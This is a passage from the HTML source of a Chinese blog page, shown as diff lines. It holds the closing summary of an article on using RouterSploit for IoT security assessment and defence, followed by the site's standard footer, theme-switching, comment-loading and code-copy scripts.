+<span class="pl-v">-</span> 证据截图
+<span class="pl-v">-</span> 修复验证步骤</pre></div>
+<hr>
+<h3>总结</h3>
+<p>RouterSploit 已经从单纯的漏洞利用工具演变为一个完整的 IoT 安全评估生态系统。通过深入了解其高级功能、开发自定义模块、集成到企业工作流以及制定相应的防御策略，安全团队可以：</p>
+<ol>
+<li><strong>主动发现风险</strong>：在攻击者之前识别和修复漏洞</li>
+<li><strong>验证控制有效性</strong>：测试现有安全措施的实际效果</li>
+<li><strong>满足合规要求</strong>：证明已进行充分的尽职调查</li>
+<li><strong>提升整体安全态势</strong>：建立持续的安全监控和改进机制</li>
+</ol>
+<p>在 IoT 设备数量爆炸式增长的今天，掌握这类专业工具的使用和防御方法，对于任何严肃的安全团队来说都是必不可少的技能。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://binghey.github.io/blog">知行合一笔记</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+let themeSettings={
+    "dark": ["dark","moon","#00f0ff","dark-blue"],
+    "light": ["light","sun","#ff5000","github-light"],
+    "auto": ["auto","sync","","preferred-color-scheme"]
+};
+function changeTheme(mode, icon, color, utheme){
+    document.documentElement.setAttribute("data-color-mode",mode);
+    document.getElementById("themeSwitch").setAttribute("d",value=IconList[icon]);
+    document.getElementById("themeSwitch").parentNode.style.color=color;
+    if(utterancesLoad==1){utterancesTheme(utheme);}
+}
+function modeSwitch(){
+    let currentMode=document.documentElement.getAttribute('data-color-mode');
+    let newMode = currentMode === "light" ? "dark" : currentMode === "dark" ? "auto" : "light";
+    localStorage.setItem("meek_theme", newMode);
+    if(themeSettings[newMode]){
+        changeTheme(...themeSettings[newMode]);
+    }
+}
+function utterancesTheme(theme){
+    const message={type:'set-theme',theme: theme};
+    const iframe=document.getElementsByClassName('utterances-frame')[0];
+    iframe.contentWindow.postMessage(message,'https://utteranc.es');
+}
+if(themeSettings[theme]){changeTheme(...themeSettings[theme]);}
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","binghey/blog");
+    script.setAttribute("issue-term","title");
+    
+    if(localStorage.getItem("meek_theme")=="dark"){script.setAttribute("theme","dark-blue");}
+    else if(localStorage.getItem("meek_theme")=="light") {script.setAttribute("theme","github-light");}
+    else{script.setAttribute("theme","preferred-color-scheme");}
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+
+
+</html>
